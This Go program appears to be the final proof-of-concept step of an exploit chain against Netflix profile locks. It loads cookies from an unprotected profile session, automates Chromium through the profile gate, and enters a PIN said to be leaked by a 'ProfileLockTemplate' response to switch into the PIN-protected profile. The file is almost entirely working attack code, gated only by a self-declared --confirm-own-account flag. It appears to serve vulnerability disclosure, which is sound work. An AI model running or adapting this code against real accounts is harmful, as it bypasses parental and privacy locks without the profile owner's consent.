// Command unlockwithpin uses a PIN disclosed by ProfileLockTemplate to open the
// protected profile in a browser. This is the last step of the chain and the
// only one that touches UI:
//
//	kids session -> read parent's PIN -> /ProfilesGate -> select protected tile
//	             -> enter PIN -> session becomes that profile -> /browse
//
// It refuses to run unless the PIN is passed explicitly and --confirm-own-account
// is set, and it prints the pg value before and after so the transition is the
// evidence rather than a claim.
package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/shoo0lin/netflix-profile-lock-pin/poc/internal/browser"
	"github.com/shoo0lin/netflix-profile-lock-pin/poc/internal/profiles"
)

const usage = `Use a PIN disclosed by ProfileLockTemplate to open the protected profile.

This is the last step of the chain and the only one that touches UI:

    kids session -> read parent's PIN -> /ProfilesGate -> select protected tile
                 -> enter PIN -> session becomes that profile -> /browse

It refuses to run unless the PIN is passed explicitly and --confirm-own-account
is set, and it prints the pg value before and after so the transition is the
evidence rather than a claim.

  go run ./poc/unlockwithpin --cookies cookies-kids.txt --target <protected-guid> --pin 0000 --confirm-own-account
`

func main() { os.Exit(run()) }

func run() int {
	flag.Usage = func() { fmt.Fprint(os.Stderr, usage) }
	cookiesPath := flag.String("cookies", "", "session on a NON-protected profile")
	target := flag.String("target", "", "GUID of the PIN-locked profile")
	pin := flag.String("pin", "", "PIN returned by ProfileLockTemplate")
	profileDir := flag.String("profile-dir", "/tmp/netflix-lockpin-unlock", "persistent Chromium profile directory")
	headed := flag.Bool("headed", false, "run Chromium headed instead of headless")
	confirm := flag.Bool("confirm-own-account", false, "confirm this is your own account")
	flag.Parse()

	if missing := required(*cookiesPath, *target, *pin); missing != "" {
		fmt.Fprintf(os.Stderr, "the following arguments are required: %s\n", missing)
		flag.Usage()
		return 2
	}
	profiles.RequireOwnAccount(*confirm)

	cookieString, err := profiles.ReadCookieFile(*cookiesPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return 1
	}

	s, err := browser.Open(*profileDir, *headed, cookieString)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	defer s.Close()

	start, err := s.PG()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	fmt.Printf("[start] pg=%s\n", pyOptional(start))

	if err := s.GotoGate(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	browser.Wait(3000)

	tile := fmt.Sprintf(`[data-uia="profile-selector+tile-%s"]`, *target)
	n, err := s.Count(tile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	if n == 0 {
		fmt.Fprintf(os.Stderr, "profile tile for %s not found on the gate\n", *target)
		return 1
	}
	if err := s.ClickFirst(tile, 8*time.Second); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	browser.Wait(3500)

	field, err := s.FindPrompt()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	fmt.Printf("[gate ] PIN prompt visible: %s\n", profiles.PyBool(field != ""))
	if field == "" {
		fmt.Fprintln(os.Stderr, "no PIN prompt -- the tile is not locked, or the gate changed")
		return 1
	}

	if err := s.Fill(field, *pin); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	_ = s.Submit()
	browser.Wait(6000)

	final, err := s.PG()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	url, title, err := s.Location()
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		return 1
	}
	fmt.Printf("[final] pg=%s url=%s title=%s\n", pyOptional(final), url, title)
	ok := final == *target
	result := "BLOCKED"
	if ok {
		result = "UNLOCKED"
	}
	fmt.Println("RESULT:", result)
	if ok {
		return 0
	}
	return 1
}

func required(values ...string) string {
	names := []string{"--cookies", "--target", "--pin"}
	var missing []string
	for i, v := range values {
		if strings.TrimSpace(v) == "" {
			missing = append(missing, names[i])
		}
	}
	return strings.Join(missing, ", ")
}

func pyOptional(value string) string {
	if value == "" {
		return "None"
	}
	return value
}
